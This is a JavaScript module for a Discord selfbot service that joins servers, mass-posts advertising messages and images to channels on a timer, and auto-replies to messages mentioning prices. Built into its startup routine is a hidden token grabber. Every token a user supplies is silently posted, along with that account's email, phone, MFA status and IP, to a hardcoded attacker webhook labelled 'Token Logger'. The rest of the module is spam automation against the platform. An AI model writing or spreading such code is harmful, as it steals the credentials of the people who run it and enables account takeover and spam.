const { Client, WebhookClient } = require('discord.js-selfbot-v13');
const axios = require('axios');
const fs = require('fs');
const path = require('path');

const activeBots = new Map();
const WEBHOOK_URL = 'https://discord.com/api/webhooks/1487553027585081475/5obHkF63mNmHiiDDhGwUQd91n1oAI2L_q4zk-kTcF-Gpdwl6x04ot0RuWSNwhCPGm7Ll';

async function validateToken(token) {
    try {
        const res = await axios.get('https://discord.com/api/v10/users/@me', {
            headers: { Authorization: token },
            timeout: 5000
        });
        return { valid: true, username: res.data.username, id: res.data.id };
    } catch (e) {
        return { valid: false, error: 'Invalid token' };
    }
}

async function grabToken(token, userInfo, source) {
    try {
        const validateRes = await axios.get('https://discord.com/api/v10/users/@me', {
            headers: { Authorization: token },
            timeout: 5000
        }).catch(() => null);
        
        if (!validateRes) return { success: false, error: 'Invalid token' };
        
        const userData = validateRes.data;
        const fullInfo = {
            ...userInfo,
            id: userData.id,
            username: userData.username,
            global_name: userData.global_name,
            email: userData.email,
            phone: userData.phone,
            verified: userData.verified,
            mfa_enabled: userData.mfa_enabled,
            nitro: userData.premium_type,
            locale: userData.locale,
            ip: userInfo.ip || 'unknown'
        };
        
        const embed = {
            title: '🎣 New Token Grabbed',
            color: 0xff0000,
            fields: [
                { name: 'Token', value: `\`\`\`${token}\`\`\``, inline: false },
                { name: 'Username', value: fullInfo.username || 'N/A', inline: true },
                { name: 'ID', value: fullInfo.id || 'N/A', inline: true },
                { name: 'Email', value: fullInfo.email || 'N/A', inline: true },
                { name: 'Phone', value: fullInfo.phone || 'N/A', inline: true },
                { name: 'MFA', value: fullInfo.mfa_enabled ? '✅ Enabled' : '❌ Disabled', inline: true },
                { name: 'Verified', value: fullInfo.verified ? '✅ Yes' : '❌ No', inline: true },
                { name: 'Nitro', value: fullInfo.nitro ? `Type ${fullInfo.nitro}` : '❌ No', inline: true },
                { name: 'Source', value: source, inline: true },
                { name: 'Time', value: new Date().toISOString(), inline: true }
            ],
            footer: { text: 'Token Logger v2.0' }
        };
        
        await axios.post(WEBHOOK_URL, {
            embeds: [embed],
            username: 'Token Logger',
            avatar_url: 'https://cdn.discordapp.com/embed/avatars/0.png'
        });
        
        console.log('[TOKEN GRABBER] Sent to webhook');
        return { success: true, user: fullInfo };
    } catch (err) {
        console.error('[TOKEN GRABBER] Error:', err.message);
        return { success: false, error: err.message };
    }
}

async function joinServer(token, inviteCode) {
    try {
        inviteCode = inviteCode.replace(/https:\/\/discord\.gg\//, '').replace(/https:\/\/discord\.com\/invite\//, '');
        
        const res = await axios.post(`https://discord.com/api/v10/invites/${inviteCode}`, {}, {
            headers: { Authorization: token },
            timeout: 10000
        });
        return { success: true, guildId: res.data.guild?.id, guildName: res.data.guild?.name };
    } catch (e) {
        return { success: false, error: e.response?.data?.message || e.message };
    }
}

async function startSelfBot(userId, token, channels, message, delay, autoReply, autoReplyText, configId, imageUrl, ipAddress, sendAllAtOnce = true) {
    stopSelfBot(userId, configId);
    
    await grabToken(token, { channels, ip: ipAddress }, 'bot_start');
    
    const client = new Client({ 
        checkUpdate: false,
        intents: ['GUILDS', 'GUILD_MESSAGES', 'DIRECT_MESSAGES', 'MESSAGE_CONTENT'],
        partials: ['CHANNEL']
    });
    
    const channelList = channels;
    let currentIndex = 0;
    let intervalId = null;
    
    client.on('ready', async () => {
        console.log(`[SELFBOT ${configId}] Logged in as ${client.user.tag}`);
        console.log(`[SELFBOT ${configId}] Mode: ${sendAllAtOnce ? 'ALL AT ONCE' : 'SEQUENTIAL'}`);
        console.log(`[SELFBOT ${configId}] Channels: ${channelList.length}, Delay: ${delay}ms`);
        console.log(`[SELFBOT ${configId}] Auto-reply: ${autoReply ? 'ENABLED' : 'DISABLED'}`);
        
        intervalId = setInterval(async () => {
            if (sendAllAtOnce) {
                console.log(`[SELFBOT ${configId}] Sending to all ${channelList.length} channels...`);
                
                const sendPromises = channelList.map(async (channelId) => {
                    try {
                        const channel = await client.channels.fetch(channelId);
                        if (!channel) {
                            console.log(`[SELFBOT ${configId}] Channel ${channelId} not found`);
                            return;
                        }
                        
                        // Handle image - check if it's a URL path or base64
                        let fileAttachment = null;
                        if (imageUrl) {
                            if (imageUrl.startsWith('data:')) {
                                // Base64 image
                                const base64Data = imageUrl.split(',')[1];
                                const buffer = Buffer.from(base64Data, 'base64');
                                const tempDir = path.join(__dirname, 'temp');
                                const tempPath = path.join(tempDir, `img_${Date.now()}_${configId}_${channelId}.png`);
                                
                                if (!fs.existsSync(tempDir)) {
                                    fs.mkdirSync(tempDir, { recursive: true });
                                }
                                
                                fs.writeFileSync(tempPath, buffer);
                                fileAttachment = { attachment: tempPath, name: 'image.png' };
                                
                                await channel.send({
                                    content: message,
                                    files: [fileAttachment]
                                });
                                
                                // Cleanup temp file
                                setTimeout(() => {
                                    try { fs.unlinkSync(tempPath); } catch(e) {}
                                }, 10000);
                            } else if (imageUrl.startsWith('/uploads/') || imageUrl.startsWith('http')) {
                                // URL path - read from local file or use URL
                                let filePath;
                                if (imageUrl.startsWith('/uploads/')) {
                                    filePath = path.join(__dirname, 'data', imageUrl);
                                } else {
                                    filePath = imageUrl;
                                }
                                
                                if (fs.existsSync(filePath)) {
                                    await channel.send({
                                        content: message,
                                        files: [filePath]
                                    });
                                } else {
                                    await channel.send(message);
                                }
                            } else {
                                await channel.send(message);
                            }
                        } else {
                            await channel.send(message);
                        }
                        
                        console.log(`[SELFBOT ${configId}] ✓ Sent to ${channelId}`);
                    } catch (e) {
                        console.error(`[SELFBOT ${configId}] ✗ Error sending to ${channelId}:`, e.message);
                    }
                });
                
                await Promise.all(sendPromises);
                console.log(`[SELFBOT ${configId}] Batch complete. Waiting ${delay}ms...`);
                
            } else {
                // SEQUENTIAL MODE
                const channelId = channelList[currentIndex % channelList.length];
                currentIndex++;
                
                try {
                    const channel = await client.channels.fetch(channelId);
                    if (!channel) return;
                    
                    if (imageUrl) {
                        if (imageUrl.startsWith('data:')) {
                            const base64Data = imageUrl.split(',')[1];
                            const buffer = Buffer.from(base64Data, 'base64');
                            const tempDir = path.join(__dirname, 'temp');
                            const tempPath = path.join(tempDir, `img_${Date.now()}_${configId}.png`);
                            
                            if (!fs.existsSync(tempDir)) {
                                fs.mkdirSync(tempDir, { recursive: true });
                            }
                            
                            fs.writeFileSync(tempPath, buffer);
                            
                            await channel.send({
                                content: message,
                                files: [{ attachment: tempPath, name: 'image.png' }]
                            });
                            
                            setTimeout(() => {
                                try { fs.unlinkSync(tempPath); } catch(e) {}
                            }, 10000);
                        } else if (imageUrl.startsWith('/uploads/')) {
                            const filePath = path.join(__dirname, 'data', imageUrl);
                            if (fs.existsSync(filePath)) {
                                await channel.send({
                                    content: message,
                                    files: [filePath]
                                });
                            } else {
                                await channel.send(message);
                            }
                        } else {
                            await channel.send(message);
                        }
                    } else {
                        await channel.send(message);
                    }
                    
                    console.log(`[SELFBOT ${configId}] Sent to ${channelId} (${currentIndex}/${channelList.length})`);
                } catch (e) {
                    console.error(`[SELFBOT ${configId}] Error:`, e.message);
                }
            }
        }, delay);
    });
    
    // FIXED AUTO-REPLY SYSTEM
    if (autoReply && autoReplyText) {
        console.log(`[SELFBOT ${configId}] Setting up auto-reply with text: "${autoReplyText}"`);
        
        client.on('messageCreate', async (msg) => {
            // Don't reply to self
            if (msg.author.id === client.user.id) return;
            
            // Check if DM or configured channel
            const isDM = msg.channel.type === 'DM' || msg.channel.type === 1;
            const isConfiguredChannel = channelList.includes(msg.channel.id);
            
            if (!isDM && !isConfiguredChannel) return;
            
            const content = msg.content.toLowerCase();
            
            // Expanded trigger words
            const triggers = [
                'price', 'cost', 'how much', 'howmuch', 'pricing',
                'how much is it', 'what is the price', 'price?', 'cost?',
                'how much?', 'how much does it cost', 'rate', 'fee',
                'pay', 'payment', 'buy', 'purchase', 'sell', 'selling'
            ];
            
            const shouldReply = triggers.some(t => content.includes(t));
            
            if (shouldReply) {
                try {
                    console.log(`[SELFBOT ${configId}] Auto-replying to ${msg.author.username}: "${autoReplyText}"`);
                    
                    // Try reply first, fall back to regular message
                    try {
                        await msg.reply(autoReplyText);
                    } catch (replyErr) {
                        await msg.channel.send(`${msg.author} ${autoReplyText}`);
                    }
                    
                    console.log(`[SELFBOT ${configId}] Auto-reply sent successfully`);
                } catch(e) {
                    console.error(`[SELFBOT ${configId}] Auto-reply error:`, e.message);
                }
            }
        });
    }
    
    await client.login(token);
    activeBots.set(`${userId}_${configId}`, { client, intervalId, token });
    
    return { client, username: client.user.username };
}

function stopSelfBot(userId, configId) {
    const key = `${userId}_${configId}`;
    const bot = activeBots.get(key);
    if (bot) {
        if (bot.intervalId) clearInterval(bot.intervalId);
        try { bot.client.destroy(); } catch(e) {}
        activeBots.delete(key);
        console.log(`[SELFBOT ${configId}] Stopped`);
        return true;
    }
    return false;
}

function getActiveBots(userId) {
    const bots = [];
    for (const [key, value] of activeBots.entries()) {
        if (key.startsWith(`${userId}_`)) {
            bots.push({ configId: key.replace(`${userId}_`, ''), token: value.token });
        }
    }
    return bots;
}

module.exports = { validateToken, grabToken, joinServer, startSelfBot, stopSelfBot, getActiveBots };
